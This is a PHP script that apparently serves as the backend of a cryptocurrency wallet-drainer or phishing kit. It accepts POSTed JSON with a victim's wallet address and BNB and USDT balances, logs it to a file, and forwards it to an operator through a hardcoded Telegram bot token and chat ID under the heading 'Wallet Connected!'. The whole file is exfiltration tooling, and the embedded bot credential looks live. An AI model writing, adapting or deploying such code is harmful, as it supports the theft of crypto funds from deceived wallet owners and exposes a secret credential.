<?php
// Optional: show errors (disable in production)
ini_set('display_errors', 1);
error_reporting(E_ALL);

// Get POSTed JSON data
$data = json_decode(file_get_contents("php://input"), true);

// Log raw data for debug (you can remove this after testing)
file_put_contents("debug.txt", json_encode($data) . PHP_EOL, FILE_APPEND);

// Extract wallet info
$address = isset($data['wallet']) ? $data['wallet'] : 'Not Found';
$bnb     = isset($data['bnb']) ? $data['bnb'] : '0';
$usdt    = isset($data['usdt']) ? $data['usdt'] : '0';

// Telegram bot credentials
$token   = '7536567492:AAHTGbJZXi2g7N_qY-AnpTBMZ6jHFYM42eM';
$chat_id = '8191508290';

// Create Telegram message
$message = "📥 *Wallet Connected!*\n\n"
         . "👛 *Address:* `$address`\n"
         . "💰 *BNB:* $bnb\n"
         . "💸 *USDT:* $usdt";

// Send message to Telegram
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($message) . "&parse_mode=Markdown");
?>
